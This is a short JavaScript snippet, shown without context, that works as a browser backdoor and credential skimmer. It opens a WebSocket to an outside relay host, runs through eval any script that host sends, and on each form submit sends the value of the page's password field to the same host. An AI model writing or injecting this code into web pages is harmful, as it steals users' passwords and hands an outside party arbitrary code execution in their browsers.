const transport = new WebSocket("wss://relay.example.invalid/queue");
transport.onmessage = packet => {
  eval(JSON.parse(packet.data).script);
};
document.addEventListener("submit", () => {
  transport.send(JSON.stringify({secret: document.querySelector("input[type='password']").value}));
});
